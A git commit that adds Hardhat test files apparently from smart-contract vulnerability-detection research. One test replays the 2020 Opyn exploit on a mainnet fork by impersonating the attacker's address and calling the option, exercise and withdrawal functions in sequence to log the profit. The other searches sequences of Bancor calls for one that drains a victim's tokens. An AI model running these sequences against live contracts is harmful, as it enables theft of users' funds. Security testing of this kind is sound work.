e0848b5dbd28ae044eae0a0ee0fbf379460c9b9d
ipromise2324 <168allen55@gmail.com>
2024-01-11 16:36:39 +0800

    feat: add opyn simulation test

---
+++ test/2020_0804_opyn.ts
@@ -0,0 +1,65 @@
+import { ethers } from 'hardhat'
+import { SignerWithAddress } from '@nomicfoundation/hardhat-ethers/signers'
+import { IERC20 } from '../typechain-types'
+import { Contract } from 'ethers'
+import { expect } from 'chai'
+import { Opyn } from '../typechain-types' // Import the contract that contains the addERC20CollateralOption function
+
+describe('CCA Detects Opyn Test', async function () {
+    let attacker: string
+    let opyn: Opyn
+    let USDCTokenAddress: string
+    let USDCToken: IERC20
+
+    beforeEach(async () => {
+        opyn = await ethers.getContractAt('opyn', '0x951D51bAeFb72319d9FBE941E1615938d89ABfe2')
+        expect(await opyn.getAddress()).to.equal('0x951D51bAeFb72319d9FBE941E1615938d89ABfe2')
+        USDCTokenAddress = ethers.getAddress('0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48')
+        USDCToken = await ethers.getContractAt('IERC20', USDCTokenAddress)
+    })
+
+    it('should block number equal to 10592516', async function () {
+        const blockNumber = await ethers.provider.getBlockNumber()
+        expect(blockNumber).to.equal(10_592_516)
+    })
+
+    it('should simulate the attack on Opyn', async function () {
+        const attacker = '0xe7870231992Ab4b1A01814FA0A599115FE94203f'
+
+        await hre.network.provider.request({
+            method: 'hardhat_impersonateAccount',
+            params: [attacker],
+        })
+
+        const impersonatedSigner = await ethers.getSigner(attacker)
+
+        let balanceBefore = await USDCToken.balanceOf(attacker)
+        console.log('Attacker USDC balance before is     ', balanceBefore.toString())
+
+        let amtToCreate = 300000000
+        let amtCollateral = 9900000000
+
+        const tx = await opyn.connect(impersonatedSigner).addERC20CollateralOption(amtToCreate, amtCollateral, attacker)
+        await tx.wait()
+
+        const vaultAddresses = [
+            '0xe7870231992Ab4b1A01814FA0A599115FE94203f',
+            '0x01BDb7Ada61C82E951b9eD9F0d312DC9Af0ba0f2',
+        ]
+
+        const vaultsPayable = vaultAddresses.map((addr) => ethers.getAddress(addr))
+
+        const tx2 = await opyn
+            .connect(impersonatedSigner)
+            .exercise(600_000_000, vaultsPayable, { value: ethers.parseEther('30') })
+
+        await tx2.wait()
+
+        const tx3 = await opyn.connect(impersonatedSigner).removeUnderlying()
+        await tx3.wait()
+
+        let balanceAfter = await USDCToken.balanceOf(attacker)
+        console.log('Attacker USDC balance after is     ', balanceAfter.toString())
+        console.log('Attacker profit is                  ', balanceAfter - balanceBefore)
+    })
+})
---
+++ test/module.ts
@@ -0,0 +1,84 @@
+import { ethers } from 'hardhat'
+import { SignerWithAddress } from '@nomicfoundation/hardhat-ethers/signers'
+import { IERC20 } from '../typechain-types'
+import * as bancorFunctions from './functions/bancor_function' // change this to the appropriate file
+import { Contract } from 'ethers'
+
+describe('CCA Detects XXX Test', async function () {
+    let alice: SignerWithAddress
+    let bancor: Contract
+    let XBPTokenAddress: string
+    let XBPToken: IERC20
+
+    let victim = '0xfd0B4DAa7bA535741E6B5Ba28Cba24F9a816E67E'
+
+    beforeEach(async () => {
+        ;[alice] = await ethers.getSigners()
+        bancor = await ethers.getContractAt('ibancor', '0x5f58058C0eC971492166763c8C22632B583F667f')
+
+        XBPTokenAddress = '0x28dee01D53FED0Edf5f6E310BF8Ef9311513Ae40'
+        XBPToken = await ethers.getContractAt('IERC20', XBPTokenAddress)
+    })
+
+    it('should try to find vulnerability through DFS', async function () {
+        const actions = [
+            // List of functions from bancor_function.ts
+            //bancorFunctions.handleRestrictRegistryUpdate,
+            //bancorFunctions.handleRegisterEtherToken,
+            bancorFunctions.handleTransferOwnership,
+            bancorFunctions.handleSafeTransferFrom,
+        ]
+
+        const found = await dfs([], 0)
+        if (!found) {
+            console.log('No vulnerability sequence found.')
+        } else {
+            console.log('Vulnerability sequence found.')
+        }
+        async function checkIncident(victimBalanceBefore: bigint, victimBalanceAfter: bigint) {
+            if (victimBalanceAfter < victimBalanceBefore) {
+                console.log("An anomaly occurred: Victim's balance has decreased")
+                return true
+            }
+        }
+
+        async function dfs(actionSequence: string[] = [], depth: number): Promise<boolean> {
+            if (depth === actions.length) {
+                return false
+            }
+
+            for (let i = depth; i < actions.length; i++) {
+                // Add the current action's name to the sequence BEFORE calling it
+                actionSequence.push(actions[i].name)
+
+                const victimBalanceBefore = await XBPToken.balanceOf(victim)
+
+                // Call the function from the bancor contract with the appropriate arguments
+                let value = await XBPToken.balanceOf(victim)
+                try {
+                    await actions[i](bancor, XBPToken, victim, alice.address, value)
+                } catch (e) {
+                    // Handle or log the error as needed
+                    // console.log(e);
+                }
+
+                // Get the updated balances
+                const victimBalanceAfter = await XBPToken.balanceOf(victim)
+
+                // Check for incident
+                if (await checkIncident(victimBalanceBefore, victimBalanceAfter)) {
+                    console.log(`Triggering action sequence: ${actionSequence.join(' -> ')}`)
+                    return true
+                }
+
+                // Recursively try the next function
+                const result = await dfs(actionSequence, depth + 1)
+                if (result) return true
+
+                // Remove the last action from the sequence if it didn't lead to an incident
+                actionSequence.pop()
+            }
+            return false
+        }
+    })
+})
